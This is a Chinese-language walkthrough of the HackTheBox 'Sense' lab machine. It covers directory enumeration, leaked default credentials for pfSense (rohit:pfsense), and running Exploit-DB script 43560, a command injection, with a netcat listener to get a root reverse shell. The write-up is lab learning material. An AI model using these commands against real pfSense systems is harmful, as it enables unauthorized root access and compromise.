# 免责声明
>本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责。

# 服务探测
```
ot💀kali)-[~/htb/Sense]
└─# nmap -sV -Pn 10.10.10.60                                                                                                                                                                                  1 ⨯
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-09 09:15 EST
Nmap scan report for 10.10.10.60
Host is up (0.36s latency).
Not shown: 998 filtered ports
PORT    STATE SERVICE  VERSION
80/tcp  open  http     lighttpd 1.4.35
443/tcp open  ssl/http lighttpd 1.4.35
```
只开了http服务，那只能从web入手了

## 目录爆破
```
┌──(root💀kali)-[~/dirsearch]
└─# gobuster dir -w /usr/share/wordlists/Web-Content/common.txt -u https://10.10.10.60/ -t 30 -k                                                                                                              1 ⨯
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://10.10.10.60/
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/12/09 09:30:38 Starting gobuster in directory enumeration mode
===============================================================
/classes              (Status: 301) [Size: 0] [--> https://10.10.10.60/classes/]
/css                  (Status: 301) [Size: 0] [--> https://10.10.10.60/css/]    
/favicon.ico          (Status: 200) [Size: 1406]                                
/includes             (Status: 301) [Size: 0] [--> https://10.10.10.60/includes/]
/index.html           (Status: 200) [Size: 329]                                  
/index.php            (Status: 200) [Size: 6690]                                 
/installer            (Status: 301) [Size: 0] [--> https://10.10.10.60/installer/]
/javascript           (Status: 301) [Size: 0] [--> https://10.10.10.60/javascript/]
/themes               (Status: 301) [Size: 0] [--> https://10.10.10.60/themes/]    
/tree                 (Status: 301) [Size: 0] [--> https://10.10.10.60/tree/]      
/widgets              (Status: 301) [Size: 0] [--> https://10.10.10.60/widgets/]   
/xmlrpc.php           (Status: 200) [Size: 384]  
```

另外用dirserch找到一个文件Changelog.txt
```
# Security Changelog 

### Issue
There was a failure in updating the firewall. Manual patching is therefore required

### Mitigated
2 of 3 vulnerabilities have been patched.

### Timeline
The remaining patches will be installed during the next maintenance window
```

说更新防火墙失败，已经修改了三个漏洞中的两个。
意思是还有一个漏洞没有修复？

## 搜寻cms漏洞
80端口是一个叫pfsense的cms，搜索这个cms的漏洞，多数是一些xss漏洞，也有命令注入漏洞，我们重点关注命令注入这一块。
```
─# searchsploit pfsense
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                  |  Path
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
pfSense - 'interfaces.php?if' Cross-Site Scripting                                                                                                                              | hardware/remote/35071.txt
pfSense - 'pkg.php?xml' Cross-Site Scripting                                                                                                                                    | hardware/remote/35069.txt
pfSense - 'pkg_edit.php?id' Cross-Site Scripting                                                                                                                                | hardware/remote/35068.txt
pfSense - 'status_graph.php?if' Cross-Site Scripting                                                                                                                            | hardware/remote/35070.txt
pfSense - (Authenticated) Group Member Remote Command Execution (Metasploit)                                                                                                    | unix/remote/43193.rb
pfSense 2 Beta 4 - 'graph.php' Multiple Cross-Site Scripting Vulnerabilities                                                                                                    | php/remote/34985.txt
pfSense 2.0.1 - Cross-Site Scripting / Cross-Site Request Forgery / Remote Command Execution                                                                                    | php/webapps/23901.txt
pfSense 2.1 build 20130911-1816 - Directory Traversal                                                                                                                           | php/webapps/31263.txt
pfSense 2.2 - Multiple Vulnerabilities                                                                                                                                          | php/webapps/36506.txt
pfSense 2.2.5 - Directory Traversal                                                                                                                                             | php/webapps/39038.txt
pfSense 2.3.1_1 - Command Execution                                                                                                                                             | php/webapps/43128.txt
pfSense 2.3.2 - Cross-Site Scripting / Cross-Site Request Forgery                                                                                                               | php/webapps/41501.txt
Pfsense 2.3.4 / 2.4.4-p3 - Remote Code Injection                                                                                                                                | php/webapps/47413.py
pfSense 2.4.1 - Cross-Site Request Forgery Error Page Clickjacking (Metasploit)                                                                                                 | php/remote/43341.rb
pfSense 2.4.4-p1 (HAProxy Package 0.59_14) - Persistent Cross-Site Scripting                                                                                                    | php/webapps/46538.txt
pfSense 2.4.4-p1 - Cross-Site Scripting                                                                                                                                         | multiple/webapps/46316.txt
pfSense 2.4.4-p3 (ACME Package 0.59_14) - Persistent Cross-Site Scripting                                                                                                       | php/webapps/46936.txt
pfSense 2.4.4-P3 - 'User Manager' Persistent Cross-Site Scripting                                                                                                               | freebsd/webapps/48300.txt
pfSense 2.4.4-p3 - Cross-Site Request Forgery                                                                                                                                   | php/webapps/48714.txt
pfSense < 2.1.4 - 'status_rrd_graph_img.php' Command Injection                                                                                                                  | php/webapps/43560.py
pfSense Community Edition 2.2.6 - Multiple Vulnerabilities                                                                                                                      | php/webapps/39709.txt
pfSense Firewall 2.2.5 - Config File Cross-Site Request Forgery                                                                                                                 | php/webapps/39306.html
pfSense Firewall 2.2.6 - Services Cross-Site Request Forgery                                                                                                                    | php/webapps/39695.txt
pfSense UTM Platform 2.0.1 - Cross-Site Scripting                                                                                                                               | freebsd/webapps/24439.txt
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

然而命令注入漏洞要求cms的密码，所以密码是什么？

## 指定扩展名爆破
指定特定几个扩展文件名，换一个大一些的字典，再次爆破
```
$ gobuster dir -u https://10.10.10.60 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -x php,cgi,html,txt -t 20
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://10.10.10.60
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,cgi,html,txt
[+] Timeout:                 10s
===============================================================
2021/12/11 02:41:05 Starting gobuster in directory enumeration mode
===============================================================
/index.php (Status: 200)
/index.html (Status: 200)
/help.php (Status: 200)
/themes (Status: 301)
/stats.php (Status: 200)
/css (Status: 301)
/edit.php (Status: 200)
/includes (Status: 301)
/license.php (Status: 200)
/system.php (Status: 200)
/status.php (Status: 200)
/javascript (Status: 301)
/changelog.txt (Status: 200)
/classes (Status: 301)
/exec.php (Status: 200)
/widgets (Status: 301)
/graph.php (Status: 200)
/tree (Status: 301)
/wizard.php (Status: 200)
/shortcuts (Status: 301)
/pkg.php (Status: 200)
/installer (Status: 301)
/wizards (Status: 301)
/xmlrpc.php (Status: 200)
/reboot.php (Status: 200)
/interfaces.php (Status: 200)
/csrf (Status: 301)
/system-users.txt (Status: 200)
/filebrowser (Status: 301)
/%7Echeckout%7E (Status: 403)
```


system-users.txt提示
```
####Support ticket###

Please create the following user


username: Rohit
password: company defaults
```

现在我们知道了一个登陆的用户名，密码据称是公司默认密码


谷歌这个cms的默认登录密码是```admin:pfsense```

现在用```rohit:pfsense```就可以正常登录


# 攻击
我们选择[这个exp](https://www.exploit-db.com/exploits/43560)

根据exp步骤：
1. 开启一个监听
> nc -lnvp 4444

2. 执行攻击
```
─(root💀kali)-[~/htb/Sense]
└─# python3 43560.py --rhost 10.10.10.60 --lhos 10.10.14.3 --lpor 4444 --username rohit --password pfsense
CSRF token obtained
Running exploit...
Exploit completed
```

3.收到反弹shell
```
┌──(root💀kali)-[~/htb/Sense]
└─# nc -lnvp 4444                  
listening on [any] 4444 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.10.60] 7866
sh: can't access tty; job control turned off
# id
uid=0(root) gid=0(wheel) groups=0(wheel)
# whoami
root
```

已经是root权限，可以读取任何文件。

# 总结
做完以后会发现是很简单的靶机，困难的地方在于第二次目录爆破的时候选择扩展名和字典。我在这里卡了很久，试过各种爆破工具和大大小小的字典。
直接在浏览器爆出用户名有点ctf的意思，真实环境应该很少这种情况。